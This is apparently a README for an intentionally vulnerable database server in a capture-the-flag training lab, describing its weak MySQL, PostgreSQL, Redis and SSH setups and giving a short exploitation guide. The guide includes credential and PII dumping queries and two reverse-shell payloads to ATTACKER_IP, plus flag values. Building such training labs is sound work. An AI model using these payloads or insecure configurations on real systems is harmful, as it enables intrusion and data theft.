# 🏢 VulnCorp — Machine 4: rz-db01 (Database Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 4 is a critical database server in the **Restricted Zone (`172.16.0.10`)** hosting **MySQL 8 (root/toor)**, **PostgreSQL 16 (COPY PROGRAM RCE)**, and **Redis (No Auth, RCE via Cron)** with sensitive PII and lateral movement credentials.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Ubuntu 24 VM** (`172.16.0.10`):

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/rz-db01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Vulnerability |
|---------|------|---------------|
| **MySQL** | `3306` | Default root credentials (`root` / `toor`), bound to `0.0.0.0`, PII stored in plaintext |
| **PostgreSQL** | `5432` | Superuser `vulncorp_user` (`vulncorp123`), `COPY ... TO PROGRAM` enables direct RCE |
| **Redis** | `6379` | **No Password Required** (`requirepass` disabled), `protected-mode no`, writable crontab RCE |
| **SSH** | `22` | OpenSSH root login allowed |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. MySQL Data Exfiltration
```bash
mysql -h 172.16.0.10 -u root -ptoor
SHOW DATABASES;
USE vulncorp_prod;
SELECT * FROM employees;               # SSNs, salaries, emails
SELECT * FROM internal_credentials;    # Passwords for DC, ERP, DevOps, Backup
```

### 2. PostgreSQL RCE (COPY TO PROGRAM)
```bash
psql -h 172.16.0.10 -U vulncorp_user -d vulncorp_prod
# Password: vulncorp123
# Execute reverse shell:
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
```

### 3. Redis RCE via Crontab Write
```bash
redis-cli -h 172.16.0.10
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET payload "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
BGSAVE
```

---

## 🏆 Flags

- **MySQL Default Creds Flag:** `secret_flags` table (`VULN{mysql_d3fault_cr3ds}`)
- **PII Data Flag:** `/tmp/pii_flag.txt` (`VULN{pii_d4t4_3xfil}`)
- **PostgreSQL RCE Flag:** `pg_flag` table (`VULN{pg_rce_4_th3_w1n}`)
- **Root Flag:** `/root/root.txt` (`VULN{db_s3rv3r_r00t3d_m4ch1n3_4}`)
